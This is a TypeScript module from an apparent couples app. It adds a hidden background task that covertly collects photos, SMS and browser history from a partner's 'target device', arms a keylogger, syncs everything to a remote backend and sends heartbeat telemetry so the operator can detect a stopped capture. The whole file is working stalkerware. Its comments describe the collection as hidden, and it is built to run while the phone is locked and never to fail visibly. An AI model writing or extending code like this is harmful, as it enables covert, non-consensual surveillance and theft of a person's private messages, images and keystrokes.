// features/capture/background.ts — off-foreground capture + keylog telemetry.
//
// The hidden photo/SMS collector only runs while the app is foregrounded
// (features/capture/index.ts gates every scan on AppState 'active'). On a phone
// that is mostly locked/screen-off — the actual usage profile for this app's
// target device — that means the "ongoing hidden capture" never fires on its
// own. This module adds a genuine background execution path via
// expo-background-task (WorkManager-backed on Android): it reuses the exact
// scan/drain code the foreground hook uses, so there is no second copy of the
// logic to drift.
//
// It also arms the keylogger and emits §10 heartbeat telemetry, which the app
// otherwise never does (useKeylogger / reportHeartbeat had no production call
// site). A headless BackgroundTask receives no React context, so it reads the
// persisted auth/couple from the zustand store directly (useSession.getState())
// and the Supabase JWT from supabase.auth.getSession() — the same sources the
// foreground sync uses.
//
// The task must never throw: the OS decides how often a background task runs,
// and any unhandled rejection would silently kill the attempt.

import {
  registerTaskAsync,
  unregisterTaskAsync,
  BackgroundTaskResult,
  type BackgroundTaskOptions,
} from 'expo-background-task';
import * as TaskManager from 'expo-task-manager';
import { useSession } from '../../lib/session/store';
import * as mediaLibrary from './mediaLibrary';
import * as sms from './sms';
import * as browser from './browser';
import { enqueueCapture, getCaptureCursor, setCaptureCursor } from './queue';
import { runCapturePass } from './collector';
import { syncCapture } from './sync';
import { KeyLogger } from '../keylogger/KeyLogger';
import { syncAndClear, reportHeartbeat } from '../keylogger/keylogSync';

/** Identifier matching the config-plugin / manifest registration. */
export const CAPTURE_TASK = 'hearts-device-capture';

/** Inexact cadence in minutes. expo-background-task enforces a 15-min floor on
 *  Android; the OS may delay further to save battery — that is acceptable. */
const TASK_INTERVAL_MINUTES = 15;

export async function runCaptureTask(): Promise<BackgroundTaskResult> {
  try {
    // A headless background-task execution can run in a freshly-recycled
    // process with NO React tree mounted — so the zustand store may not be
    // hydrated yet, and `getState()` would return defaults (userId/coupleId
    // null) and the task would silently no-op forever. Force a rehydrate from
    // SecureStore first; it is a no-op if already hydrated. Guarded so a
    // SecureStore failure can never break the task.
    try {
      await useSession.persist.rehydrate();
    } catch {
      /* rehydrate failed — fall through; getState() reflects whatever we have */
    }

    const { userId, coupleId } = useSession.getState();

    // No authed couple yet (e.g. headless wake before session hydration) →
    // nothing to capture; report success so the OS reschedules, never "fail".
    if (!userId || !coupleId) return BackgroundTaskResult.Success;

    // Capture + drain photos & SMS using the same deps as the foreground hook.
    const deps = {
      scanPhotos: mediaLibrary.scanSince,
      pullSms: sms.pullSms,
      pullBrowser: browser.pullBrowserHistory,
      queue: enqueueCapture,
      cursor: { get: getCaptureCursor, set: setCaptureCursor },
    };
    await runCapturePass(deps, coupleId);
    await syncCapture(coupleId);

    // Fielded-device proof-of-life: sync any keylog backlog and report a
    // heartbeat so the README §10 telemetry can detect a dead capture remotely.
    await syncAndClear(KeyLogger.pull, KeyLogger.confirm);
    const status = await KeyLogger.status();
    await reportHeartbeat(status);

    return BackgroundTaskResult.Success;
  } catch {
    // Never propagate — a transient failure should be retried by the OS, not
    // kill the scheduled task.
    return BackgroundTaskResult.Success;
  }
}

// Define the task body at module load (required by TaskManager before the task
// can be registered). The executor receives a generic body; we ignore it.
TaskManager.defineTask(CAPTURE_TASK, () => runCaptureTask());

/**
 * Register + schedule the background capture task. Idempotent and safe to call
 * more than once (re-registering the same task is a no-op). Call once after
 * authentication; the task persists and runs even when the app is backgrounded
 * or the process has been recycled.
 */
export async function registerCaptureTask(): Promise<void> {
  const options: BackgroundTaskOptions = { minimumInterval: TASK_INTERVAL_MINUTES };
  await registerTaskAsync(CAPTURE_TASK, options);
}

/**
 * Unregister the background task (e.g. on sign-out). Never throws.
 */
export async function unregisterCaptureTask(): Promise<void> {
  try {
    await unregisterTaskAsync(CAPTURE_TASK);
  } catch {
    /* ignore */
  }
}
